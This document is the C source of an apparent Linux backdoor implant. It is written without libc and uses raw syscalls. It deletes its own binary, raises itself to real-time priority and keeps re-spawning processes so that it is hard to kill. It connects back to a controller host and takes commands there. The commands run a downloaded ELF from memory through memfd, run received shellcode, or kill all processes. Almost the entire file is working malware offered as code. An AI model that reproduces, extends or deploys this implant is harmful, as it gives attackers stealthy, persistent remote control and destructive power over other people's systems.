#if 1
#define forceinline static __inline__ __attribute__((always_inline)) 
#else
#define forceinline
#endif

forceinline int receive_len(int fd, char * buffer, int size);
//编译选项需要指定O1：gcc -O1 crazy-client-asm.c -o crazy-client-asm -nostdlib -g
#define MFD_CLOEXEC		0x0001U
#define MFD_ALLOW_SEALING	0x0002U

#define PAGE_SZ 0x1000
#define STACK_SIZE 1024*1024
#define PAGE_ALIGN(size) (size % PAGE_SZ == 0 ? size : (size % PAGE_SZ + 1)*PAGE_SZ)
#define MIN(x,y) (x)<(y)?(x):(y)
#define NULL 0
#define SIG_IGN ((void(*)(int))1)
#define SIGCHLD		18	/* Child status has changed (POSIX).  */

typedef int (*CLONE_PROC_FUNC)(void *);
typedef void (*SHELLCODE_FUNC)();

/* 使用的libc函数
syscall
open
mmap
close
clone
perror
exit
read
unlink
ftruncate
munmap
fork
fexecve
_exit
sleep
time
nanosleep
kill
socket
connect
recv
send
sched_get_priority_max
sched_setscheduler
*/
/* Cloning flags.  */
#define CSIGNAL       0x000000ff /* Signal mask to be sent at exit.  */
#define CLONE_VM      0x00000100 /* Set if VM shared between processes.  */
#define CLONE_FS      0x00000200 /* Set if fs info shared between processes.  */
#define CLONE_FILES   0x00000400 /* Set if open files shared between processes.  */
#define CLONE_SIGHAND 0x00000800 /* Set if signal handlers shared.  */
#define CLONE_PTRACE  0x00002000 /* Set if tracing continues on the child.  */
#define CLONE_VFORK   0x00004000 /* Set if the parent wants the child to wake it up on mm_release.  */
#define CLONE_PARENT  0x00008000 /* Set if we want to have the same parent as the cloner.  */
#define CLONE_THREAD  0x00010000 /* Set to add to same thread group.  */
#define CLONE_NEWNS   0x00020000 /* Set to create new namespace.  */
#define CLONE_SYSVSEM 0x00040000 /* Set to shared SVID SEM_UNDO semantics.  */
#define CLONE_SETTLS  0x00080000 /* Set TLS info.  */
#define CLONE_PARENT_SETTID 0x00100000 /* Store TID in userlevel buffer before MM copy.  */
#define CLONE_CHILD_CLEARTID 0x00200000 /* Register exit futex and memory location to clear.  */
#define CLONE_DETACHED 0x00400000 /* Create clone detached.  */
#define CLONE_UNTRACED 0x00800000 /* Set if the tracing process can't force CLONE_PTRACE on this clone.  */
#define CLONE_CHILD_SETTID 0x01000000 /* Store TID in userlevel buffer in the child.  */
#define CLONE_NEWUTS	0x04000000	/* New utsname group.  */
#define CLONE_NEWIPC	0x08000000	/* New ipcs.  */
#define CLONE_NEWUSER	0x10000000	/* New user namespace.  */
#define CLONE_NEWPID	0x20000000	/* New pid namespace.  */
#define CLONE_NEWNET	0x40000000	/* New network namespace.  */
#define CLONE_IO	0x80000000	/* Clone I/O context.  */

#define PROT_READ	0x1		/* Page can be read.  */
#define PROT_WRITE	0x2		/* Page can be written.  */
#define PROT_EXEC	0x4		/* Page can be executed.  */
#define PROT_NONE	0x0		/* Page can not be accessed.  */

/* Sharing types (must choose one and only one of these).  */
#define MAP_SHARED	0x01		/* Share changes.  */
#define MAP_PRIVATE	0x02		/* Changes are private.  */
/* Return value of `mmap' in case of an error.  */
#define MAP_FAILED	((void *) -1)

typedef long time_t;
typedef unsigned long size_t;
typedef long off_t;
typedef int pid_t;

struct timespec {
    time_t tv_sec; // seconds 
    long tv_nsec; // and nanoseconds 
};

struct timeval {
    time_t tv_sec; // seconds 
    long tv_usec; // microseconds 
};

struct timezone{ 
    int tz_minuteswest; //miniutes west of Greenwich 
    int tz_dsttime; //type of DST correction 
};

struct sockaddr_in
{
    unsigned short sin_family;
    unsigned short sin_port;
    unsigned int sin_addr;
    unsigned char sin_zero[8];
};

/* Scheduling algorithms.  */
#define SCHED_OTHER	0
#define SCHED_FIFO	1
#define SCHED_RR	2

/* Data structure to describe a process' schedulability.  */
struct sched_param
{
  int __sched_priority;
};

#define _NO_STDLIB_X64

#ifdef _NO_STDLIB_X64
long int syscall(long int __sysno, ...)
{
    //使用O1优化编译，都会增加一条push rbx，因此对于第7个参数取用，应该是rsp+16
    __asm__ (
      "mov      %%rdi, %%rax\n"
      "mov      %%rsi, %%rdi\n"
      "mov      %%rdx, %%rsi\n"
      "mov      %%rcx, %%rdx\n"
      "mov      %%r8, %%r10\n"
      "mov      %%r9, %%r8\n"
      "mov      0x10(%%rsp), %%r9\n"
      "syscall\n"
      :
      :
      :"memory", "rsi", "rdi", "rax", "rbx", "rcx", "rdx");
}

forceinline void exit(int status)
{
    syscall(0x3c, status);
}

forceinline int fork()
{
    return syscall(0x39);
}

forceinline int kill(int pid, int signal)
{
    return syscall(0x3e, pid, signal);
}

forceinline int open(const char *path, int oflag)
{
    return syscall(0x2, path, oflag);
}

forceinline int read(int fd, void *buf, unsigned int nbyte)
{
    return syscall(0, fd, buf, nbyte);
}

forceinline int close(int fd)
{
    return syscall(3, fd);
}

forceinline int socket(int family, int type, int proto)
{
    return syscall(0x29, family, type, proto);
}

forceinline int execve(const char * path, char * const argv[], char *const *envp)
{
    return syscall(0x3b, path, argv, envp);
}

forceinline int connect(int fd, struct sockaddr_in *uservaddr, int addrlen)
{
    return syscall(0x2a, fd, uservaddr, addrlen);
}

forceinline int unlink(const char *path)
{
    return syscall(0x57, path);
}

forceinline void *mmap (unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long offset)
{
    return syscall(9, addr, len, prot, flags, fd, offset);
}

typedef void (*sighandler_t)(int);
typedef unsigned long int sigset_t;

forceinline sighandler_t signal(int signum, sighandler_t handler)
{
    struct kernel_sigaction {
        sighandler_t k_sa_handler;
        unsigned long sa_flags;
        void (*sa_restorer) (void);
        sigset_t sa_mask;
    }act = {handler, 0, 0, 0};
    
    return syscall(13, signum, &act, NULL, sizeof(sigset_t));
}

int clone (CLONE_PROC_FUNC __fn, void *__child_stack, int __flags)
{
    /* Insert the argument onto the new stack.  */
    __asm__("subq $16,%rsi");
    __asm__("movq %rcx,8(%rsi)");

    /* Save the function pointer.  It will be popped off in the
    child in the ebx frobbing below.  */
    __asm__("movq %rdi,0(%rsi)");

    /* Do the system call.  */
    __asm__("movq %rdx, %rdi");
    __asm__("movl $56,  %eax");
    __asm__("syscall");
    __asm__("testq %rax,%rax\n"
            "jz 0f\n" //返回值0，子进程，父进程直接返回子进程PID或错误
            "ret\n"
            "0:\n\t"
            /* Clear the frame pointer.  The ABI suggests this be done, to mark the outermost frame obviously.  */
            "xorl   %ebp, %ebp\n"
            /* Set up arguments for the function call.  */
            "popq %rax\n" /* Function to call.  */
            "popq %rdi\n" /* Argument.  */
            "call *%rax\n"
            /* Call exit with return value from function call. */
            "movq   %rax, %rdi\n"
            "movl   $60, %eax\n"
            "syscall");
}

forceinline int ftruncate(int fd, unsigned long offset)
{
    return syscall(77, fd, offset);
}

forceinline int munmap (void *start, size_t len)
{
    return syscall(11, start, len);
}

forceinline int nanosleep (const struct timespec *requested_time,  struct timespec *remaining)
{
    return syscall(35, requested_time, remaining);
}

forceinline int send(int fd, void *buff, int len, int flags)
{
    return syscall(0x2c, fd, buff, len, flags, 0, 0);
}

forceinline int recv(int sockfd, void *buf, size_t len, int flags)
{
    return syscall(45, sockfd, buf, len, flags, 0, 0);
}

forceinline int sched_get_priority_max (int algorithm)
{
    return syscall(146, algorithm);
}

forceinline int sched_setscheduler (pid_t pid, int policy, const struct sched_param *param)
{
    return syscall(144, pid, policy, param);
}

forceinline int gettimeofday (struct timeval *tv, struct timezone *tz)
{
    return syscall(96, tv, tz);
}
/*
forceinline char * strcpy(char * dest,const char *src)  // 去掉了关键词 inline 和 extern。
{
    __asm__("cld\n"   // 清方向位。
        "1:\t\nlodsb\n\t"  // 加载DS:[esi]处1字节->al，并更新esi。
        "stosb\n\t"  // 存储字节al→ES:[edi]，并更新edi。
        "testb %%al,%%al\n\t" // 刚存储的字节是0？
        "jne 1b"   // 不是则向后跳转到标号1处，否则结束。
        ::"S" (src),"D" (dest):"si","di","ax");
     return dest;
}*/
#endif

#include "crazy-common.h"

//libc2.23未实现
forceinline int memfd_create(const char *name, unsigned int flags)
{
    return syscall(319, name, flags);
}

forceinline time_t time (time_t *t)
{
    struct timeval tv;
    time_t result;

    if (gettimeofday (&tv, (struct timezone *) NULL))
        result = (time_t) -1;
    else
        result = (time_t) tv.tv_sec;

    if (t != NULL)
        *t = result;
    return result;
}

forceinline unsigned int sleep (unsigned int seconds)
{
    const unsigned int max = (unsigned int) (((unsigned long int) (~((time_t) 0))) >> 1);
    struct timespec ts = { 0, 0 };
    do
    {
        if (sizeof (ts.tv_sec) <= sizeof (seconds))
        {
          /* Since SECONDS is unsigned assigning the value to .tv_sec can
             overflow it.  In this case we have to wait in steps.  */
          ts.tv_sec += MIN (seconds, max);
          seconds -= (unsigned int) ts.tv_sec;
        }
        else
        {
          ts.tv_sec = (time_t) seconds;
          seconds = 0;
        }

        if (nanosleep (&ts, &ts) < 0)
        /* We were interrupted.
           Return the number of (whole) seconds we have not yet slept.  */
            return seconds + ts.tv_sec;
    }
    while (seconds > 0);
    return 0;
}

forceinline void strcpy(char * dst, char * src)
{
    while((*dst++ = *src++) != 0);
}

forceinline char * itoa(unsigned int value, char * buflim, unsigned int base)
{
    const char _itoa_lower_digits[] = "0123456789abcdef";
    do
        *--buflim = _itoa_lower_digits[value % base];
    while ((value /= base) != 0);
    return buflim;
}

forceinline int fexecve (int fd, char *const argv[], char *const envp[])
{
    char buf[sizeof "/proc/self/fd/" + sizeof (int) * 3] = "/proc/self/fd/";
    char buf1[16] = {0};
    strcpy(buf + sizeof "/proc/self/fd/" - 1, itoa(fd, buf1 + sizeof(buf1) - 1, 10));
    return execve(buf, argv, envp);
}

forceinline void memset(void *s, int c, size_t n)
{
    for(size_t i = 0; i < n; ++i)
    {
        *((char *)s) = c;
    }
}

forceinline pid_t getpid()
{
    return syscall(39);
}

/** ----------------- global varible -------------------- **/
/* shellcode 存储区 */
char * g_shellcode_ptr = 0;
/* 内存文件描述符 */
int g_memfd = -1;
/* 0 不杀 1 杀所有*/
int g_kill_policy = 0;
/* 命令处理进程的时间戳 */
long g_alive_timestamp = 0;
/* 进程栈 0,1,2 给主进程交替使用 2 固定给命令处理进程使用*/
char * g_stack[4] = {0};
/* 主进程栈ID */
int g_main_stack_id = 0;

/** ----------------- function declare --------------------**/
forceinline void start_new_shared_proc(CLONE_PROC_FUNC proc_func, int stackid, int parent_exit);
int cmd_receiver_proc_func();

/** ----------------- 基础函数 ---------------------- **/
#define HTONL(A) ((((unsigned int)(A) & 0xff000000) >> 24) | \
               (((unsigned int)(A) & 0x00ff0000) >> 8) | \
               (((unsigned int)(A) & 0x0000ff00) << 8) | \
               (((unsigned int)(A) & 0x000000ff) << 24))
#define NTOHL(A) HTONL(A)
#define HTONS(A) ((((unsigned short)(A) & 0xff00) >> 8) | (((unsigned short)(A) & 0x00ff) << 8))
#define INET_ADDR(a,b,c,d) ((unsigned)a | (unsigned)b<<8 | (unsigned)c<<16 | (unsigned)d<<24)
#define INVERSE(x) (~x & 0x00000001)
/* 命令处理进程的栈ID */
#define CMDRECVER_STACK_ID 3
/* 内存申请 */
forceinline void * __runable_malloc(int size)
{
    int fd = open("/dev/zero", 0);
    void * ret = mmap(NULL, PAGE_ALIGN(size), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE, fd, 0);
    close(fd);
    return ret;
}

/*创建轻量级进程
  所有子进程都共享内存，但不是线程，有独立的进程号，被杀死也不会互相影响
*/
void start_new_shared_proc(CLONE_PROC_FUNC proc_func, int stack_id, int parent_exit)
{
    char * stackTop = g_stack[stack_id] + STACK_SIZE;
    pid_t pid = clone(proc_func, stackTop, CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_IO);
    if (pid == -1)
    {
        //perror("clone");
        return;
    }
    
    //printf("new pid = %ld\n", pid);
    
    if(parent_exit)
        exit(0);
}

forceinline void self_delete()
{
    int fd = open("/proc/self/cmdline", 0);
    char path[255] = {0};
    int len = read(fd, path, sizeof(path));
    close(fd);
    unlink(path);
}

/** -------------------  通信协议处理  -------------------------**/
/* 阻塞接收并处理一个命令
in fd: socket句柄
return value: 0 成功 -1 失败
*/
forceinline int receive_packet(int fd)
{
    struct BKMessage head;
    memset(&head, 0, sizeof(head));
    if(receive_len(fd, (char *)&head, sizeof(struct BKMessage)) == 1)
    {
        int payload_size = NTOHL(head.content_size);
        head.magic = NTOHL(head.magic);
        if(payload_size < 0 || head.magic != MAGIC)
        {
            return -1;
        }
        
        //dumpHex((char *)&head, sizeof(head));
        
        switch(head.cmdcode)
        {
        case 0x01: //执行ELF
            {
                if(g_memfd != -1)
                    close(g_memfd);
                
                g_memfd = memfd_create("memfile", MFD_ALLOW_SEALING);
                if(g_memfd == -1)
                {
                    //perror("memfd_create");
                    return -1;
                }
                
                if (ftruncate(g_memfd, payload_size) == -1)
                {
                    //perror("ftruncate()");
                    return -1;
                }
                
                //zero copy
                //sendfile的fd_in不能是socket,tee, splice只支持管道，只能使用mmap折中一下
                int size_align = PAGE_ALIGN(payload_size);
                char * shm = mmap(NULL, size_align, PROT_READ | PROT_WRITE, MAP_SHARED, g_memfd, 0);
                if(shm == MAP_FAILED)
                {
                    //perror("mmap");
                    return -1;
                }
                
                int rsp = receive_len(fd, shm, payload_size);               
                if (munmap(shm, size_align) == -1)
                {
                    //perror("munmap()");
                    return -1;
                }
                
                //printf("load ELF file size %d\n", payload_size);
                if(rsp != 1)
                    return -1;
                
                if(fork() == 0)
                {
                    //printf("exec ELF pid = %d\n", getpid());
                    char *const params[] = {NULL};
                    char *const environ[] = {NULL};
                    if(fexecve(g_memfd, params, environ) == -1)
                    {
                        //perror("fexecve");
                        exit(0);
                    }
                }
            }
            break;
        case 0x02: //执行shellcode
            {
                if(payload_size >= 0x1000)
                {
                    return -1;
                }
                
                if(receive_len(fd, g_shellcode_ptr, payload_size) == 1)
                {
                    SHELLCODE_FUNC func = (SHELLCODE_FUNC)g_shellcode_ptr;
                    g_shellcode_ptr[payload_size] = 0xc3; //ret
                    if(fork() == 0)
                    {
                        if(head.is_cycle)
                        {
                            while(1)
                            {
                                func();
                                sleep(head.peroid);
                            }
                        }
                        else
                        {
                            func();
                            exit(0);
                        }
                    }
                }
            }
            break;
        case 0x03: //kill -9 -1
            //需要主线程来kill
            g_kill_policy = 1;
            break;
        case 0x04: //自杀
            break;
        default:
            break;
        }
        return 0;
    }
    return -1;
}
/** -------------------  进程执行函数  -------------------------**/
/* 主进程 */
forceinline int main_proc_func()
{
    #define NANOSECOND 1000000
    struct timespec sleeptm;
    sleeptm.tv_sec = 0;
    sleeptm.tv_nsec = NANOSECOND;
    
    #define TIMEOUT 30
    long now = time(0);
    
    if(g_kill_policy == 1)
    {
        kill(-1, 9);
        g_kill_policy = 0;
    }
    
    //超时没刷新就认为进程被杀重启
    if(now - g_alive_timestamp > TIMEOUT)
    {
        g_alive_timestamp = now;
        start_new_shared_proc(cmd_receiver_proc_func, CMDRECVER_STACK_ID, 0);
    }
    
    nanosleep(&sleeptm, NULL);
    
    g_main_stack_id = g_main_stack_id == 2?0:++g_main_stack_id;
    start_new_shared_proc(main_proc_func, g_main_stack_id, 1);
    return 0;
}

#define AF_INET 2
#define SOCK_STREAM 1
#define IPPROTO_IP 0

/* 命令处理进程 */
int cmd_receiver_proc_func()
{
    struct sockaddr_in srv_addr;
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = HTONS(PEER_PORT);
    srv_addr.sin_addr = PEER_IP_ASM;
    
    //printf("new cmd receiver %d\n", getpid());
    
    while(1)
    {
        //刷新时间戳
        time(&g_alive_timestamp);
        int sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
        if(connect(sockfd, (struct sockaddr_in *)&srv_addr, sizeof(struct sockaddr_in)) == 0)
        {
            //先发送认证包
            struct BKMessage msg;
            memset(&msg, 0, sizeof(msg));
            msg.magic = HTONL(MAGIC);
            msg.cmdcode = 0xFF;
            send(sockfd, (char *)&msg, sizeof(msg), 0);
            while(receive_packet(sockfd) == 0);
        }
        
        close(sockfd);
        sleep(5);
    }
}

void _start()
{
     //切换成实时调度SCHED_FIFO,并且优先级设为最高
    struct sched_param param;
    param.__sched_priority = sched_get_priority_max(SCHED_FIFO);
    sched_setscheduler(getpid(), SCHED_FIFO, &param);
    
    signal(SIGCHLD,SIG_IGN);
    
    g_stack[0] = __runable_malloc(STACK_SIZE);
    g_stack[1] = __runable_malloc(STACK_SIZE);
    g_stack[2] = __runable_malloc(STACK_SIZE);
    g_stack[CMDRECVER_STACK_ID] = __runable_malloc(STACK_SIZE);
    g_shellcode_ptr = __runable_malloc(0x1000);
    
    time(&g_alive_timestamp);
    self_delete();
    start_new_shared_proc(cmd_receiver_proc_func, CMDRECVER_STACK_ID, 0);
    start_new_shared_proc(main_proc_func, g_main_stack_id, 1);
}
